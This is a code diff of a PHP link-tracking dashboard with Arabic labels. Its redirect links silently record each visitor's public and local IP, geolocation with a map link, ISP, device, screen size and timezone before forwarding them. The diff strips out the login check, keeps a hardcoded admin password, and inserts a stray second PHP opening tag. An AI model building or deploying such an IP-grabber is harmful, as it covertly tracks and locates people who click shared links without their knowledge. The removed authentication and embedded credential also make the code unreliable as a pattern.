@@ -4,27 +4,13 @@ ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 session_start();
-
 // بيانات الحساب المخصصة لك
 $admin_user = "SCLC USER";
 $admin_pass = "aziz2000";
-
-if (isset($_GET['logout'])) {
-    session_destroy();
-    header("Location: /");
-    exit();
-}
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['login'])) {
-    if (isset($_POST['username']) and isset($_POST['password'])) {
-        if ($_POST['username'] === $admin_user and$_POST['password'] === $admin_pass) {$_SESSION['logged_in'] = true;
-            header("Location: /");
-            exit();
-        } else {
-            $login_error = "اسم المستخدم أو كلمة المرور غير صحيحة!";
-        }
-    }
-}
+<?php
+// إظهار الأخطاء للتحقق والتأكد من العمل
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
 
 try {
     $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
@@ -57,8 +43,8 @@ try {
 }
 
 function get_real_ip() {
-    if (!empty($_SERVER['HTTP_X-FORWARDED-FOR'])) {
-        $ips = explode(',',$_SERVER['HTTP_X-FORWARDED-FOR']);
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
         return trim($ips[0]);
     }
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
@@ -99,14 +85,14 @@ function get_ip_details($ip) {
         return [
             'country' => $data['country'] ?? 'غير معروف',
             'city' => $data['city'] ?? 'غير معروف',
-            'lat' => $data['lat'] ?? '36.7538',              'lon' =>$data['lon'] ?? '3.0588',
+            'lat' => $data['lat'] ?? '36.7538',             'lon' =>$data['lon'] ?? '3.0588',
             'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
         ];
     }
     return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
 }
 
-// 1. معالجة إعادة التوجيه (مفتوحة ليعمل التتبع للزوار)
+// 1. معالجة إعادة التوجيه
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
     $stmt =$db->prepare("SELECT target_url FROM links WHERE code = ?");
@@ -124,7 +110,9 @@ if (isset($_GET['r'])) {
         try {
             $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
             $logStmt->execute([$code, $public_ip,$local_ip, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
-        } catch (Exception $e) {}
+        } catch (Exception $e) {
+            // الاستمرار في حالة خطأ السجل
+        }
 
         header("Location: " . $target);
         exit();
@@ -132,48 +120,6 @@ if (isset($_GET['r'])) {
         die("الرابط غير موجود.");
     }
 }
-
-// إذا لم يتم تسجيل الدخول، تظهر واجهة تسجيل الدخول فقط
-if (!isset($_SESSION['logged_in']) or$_SESSION['logged_in'] !== true):
-?>
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - لوحة التحكم</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-        body { background-color: #0b0f19; color: #f3f4f6; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 15px; }
-        .login-card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 30px; width: 100%; max-width: 400px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-        h2 { color: #38bdf8; font-size: 20px; margin-bottom: 20px; text-align: center; }
-        .form-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 15px; }
-        input { background: #030712; border: 1px solid #374151; border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; outline: none; }
-        input:focus { border-color: #38bdf8; }
-        button { background: #0284c7; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: background 0.2s; font-size: 15px; width: 100%; }
-        button:hover { background: #0369a1; }
-        .error { background: #7f1d1d; color: #fca5a5; padding: 10px; border-radius: 6px; font-size: 13px; margin-bottom: 15px; text-align: center; }
-    </style>
-</head>
-<body>
-    <div class="login-card">
-        <h2>🔒 تسجيل الدخول للوحة التحكم</h2>
-        <?php if (isset($login_error)): ?>
-            <div class="error"><?php echo $login_error; ?></div>
-        <?php endif; ?>
-        <form method="POST">
-            <div class="form-group">
-                <input type="text" name="username" placeholder="اسم المستخدم" required>
-                <input type="password" name="password" placeholder="كلمة المرور" required>
-                <button type="submit" name="login">دخول</button>
-            </div>
-        </form>
-    </div>
-</body>
-</html>
-<?php
-exit();
-endif;
 
 // 2. إنشاء رابط جديد
 $generated_link = "";
@@ -217,12 +163,10 @@ if (!empty($filter_code)) {
         .card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
         .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
         h1 { color: #38bdf8; font-size: 22px; font-weight: 800; }
-        .stats-group { display: flex; gap: 10px; align-items: center; }
+        .stats-group { display: flex; gap: 10px; }
         .stat-box { background: #1f2937; padding: 8px 14px; border-radius: 8px; text-align: center; border: 1px solid #374151; }
         .stat-box span { display: block; font-size: 10px; color: #9ca3af; }
         .stat-box strong { font-size: 16px; color: #38bdf8; }
-        .logout-btn { background: #dc2626; padding: 8px 14px; font-size: 13px; border-radius: 8px; color: #fff; text-decoration: none; font-weight: bold; }
-        .logout-btn:hover { background: #b91c1c; }
         h2 { color: #38bdf8; font-size: 16px; margin-bottom: 12px; font-weight: 700; }
         .form-group { display: flex; flex-direction: column; gap: 10px; }
         @media(min-width: 600px) { .form-group { flex-direction: row; } }
@@ -242,4 +186,138 @@ if (!empty($filter_code)) {
         .copy-btn { background: #374151; padding: 6px 10px; font-size: 11px; border-radius: 4px; cursor: pointer; color: #fff; border: none; }
         .copy-btn.success { background: #059669; }
         .map-btn { background: #047857; color: #fff; padding: 5px 10px; border-radius: 6px; font-size: 11px; text-decoration: none; font-weight: bold; display: inline-block; }
-        .map-btn:hover { background: #065
+        .map-btn:hover { background: #065f46; }
+        .link-row { display: flex; gap: 8px; margin-top: 6px; align-items: center; }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const redirectCode = urlParams.get('r');
+            const hasScreen = urlParams.has('screen');
+
+            if (redirectCode && !hasScreen) {
+                const screenRes = screen.width + "x" + screen.height;
+                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                // التوجيه السريع مع إرسال الأبعاد والمنطقة الزمنية
+                window.location.href = `/?r=${redirectCode}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
+            }
+        });
+
+        function copyText(text, btnElement) {
+            navigator.clipboard.writeText(text).then(() => {
+                const original = btnElement.innerText;
+                btnElement.innerText = "تم ✓";
+                btnElement.classList.add("success");
+                setTimeout(() => {
+                    btnElement.innerText = original;
+                    btnElement.classList.remove("success");
+                }, 2000);
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        
+        <div class="card header">
+            <div>
+                <h1>Hello World from azez</h1>
+                <p style="color: #9ca3af; font-size: 12px; margin-top: 2px;">لوحة تحكم تتبع الروابط المتقدمة</p>
+            </div>
+            <div class="stats-group">
+                <div class="stat-box">
+                    <span>الروابط</span>
+                    <strong><?php echo $total_links; ?></strong>
+                </div>
+                <div class="stat-box">
+                    <span>النقرات</span>
+                    <strong style="color: #34d399;"><?php echo $total_visits; ?></strong>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>🔗 إنشاء رابط تتبع جديد</h2>
+            <form method="POST" class="form-group">
+                <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف (مثال: youtube.com)" required>
+                <button type="submit" name="create">توليد الرابط</button>
+            </form>
+
+            <?php if (!empty($generated_link)): ?>
+                <div class="result-box">
+                    <span style="font-size: 11px; color: #9ca3af;">رابط التتبع النشط:</span>
+                    <div class="link-row">
+                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
+                        <button type="button" class="copy-btn" style="padding: 10px 14px;" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">نسخ الرابط</button>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 10px; font-size: 11px;">
+                        <div style="display: flex; align-items: center; gap: 8px;">
+                            <span>كود التتبع: <strong style="color: #34d399; font-size: 13px;"><?php echo htmlspecialchars($tracking_code); ?></strong></span>
+                            <button type="button" class="copy-btn" onclick="copyText('<?php echo htmlspecialchars($tracking_code); ?>', this)">نسخ الكود</button>
+                        </div>
+                        <a href="/?track=<?php echo htmlspecialchars($tracking_code); ?>" style="color: #38bdf8; text-decoration: none;">إحصائيات هذا الرابط ←</a>
+                    </div>
+                </div>
+            <?php endif; ?>
+        </div>
+
+        <div class="card">
+            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; margin-bottom: 10px;">
+                <h2>📊 سجلات الزيارات الحية</h2>
+                <form method="GET" style="display: flex; gap: 5px; margin: 0; width: 100%; max-width: 300px;">
+                    <input type="text" name="track" placeholder="بحث بالكود..." value="<?php echo htmlspecialchars($filter_code); ?>" style="padding: 8px; font-size: 12px;">
+                    <button type="submit" style="padding: 8px 12px; font-size: 12px;">بحث</button>
+                    <?php if(!empty($filter_code)): ?>
+                        <a href="/" class="btn" style="background: #dc2626; padding: 8px 10px; font-size: 12px;">إلغاء</a>
+                    <?php endif; ?>
+                </form>
+            </div>
+
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>الكود</th>
+                            <th>عنوان IP العام</th>
+                            <th>عنوان IP المحلي</th>
+                            <th>نوع الجهاز والموديل</th>
+                            <th>الموقع الخريطة</th>
+                            <th>مزود الخدمة</th>
+                            <th>الشاشة والتوقيت</th>
+                            <th>الوقت</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <?php if (empty($logs)): ?>
+                            <tr><td colspan="9" style="text-align: center; color: #6b7280; padding: 25px;">لا توجد أي زيارات مسجلة حتى الآن.</td></tr>
+                        <?php else: ?>
+                            <?php foreach ($logs as$log): ?>
+                            <tr>
+                                <td><?php echo $log['id']; ?></td>
+                                <td>
+                                    <span class="badge"><?php echo htmlspecialchars($log['code']); ?></span>
+                                    <button type="button" class="copy-btn" style="font-size: 9px; padding: 2px 5px; margin-right: 3px;" onclick="copyText('<?php echo htmlspecialchars($log['code']); ?>', this)">نسخ</button>
+                                </td>
+                                <td class="ip-public"><?php echo htmlspecialchars($log['public_ip'] ?? $log['ip'] ?? 'N/A'); ?></td>
+                                <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? '192.168.1.X'); ?></td>
+                                <td style="color: #fbbf24; font-weight: bold;"><?php echo htmlspecialchars($log['device_info']); ?></td>
+                                <td>
+                                    <strong><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></strong><br>
+                                    <a class="map-btn" href="https://www.google.com/maps?q=<?php echo htmlspecialchars($log['lat']); ?>,<?php echo htmlspecialchars($log['lon']); ?>" target="_blank">📍 خريطة جوجل</a>
+                                </td>
+                                <td><strong style="color: #38bdf8;"><?php echo htmlspecialchars($log['isp']); ?></strong></td>
+                                <td><?php echo htmlspecialchars($log['screen_res']); ?> - <?php echo htmlspecialchars($log['timezone']); ?></td>
+                                <td style="color: #9ca3af; white-space: nowrap;"><?php echo htmlspecialchars($log['created_at']); ?></td>
+                            </tr>
+                            <?php endforeach; ?>
+                        <?php endif; ?>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+    </div>
+</body>
+</html>
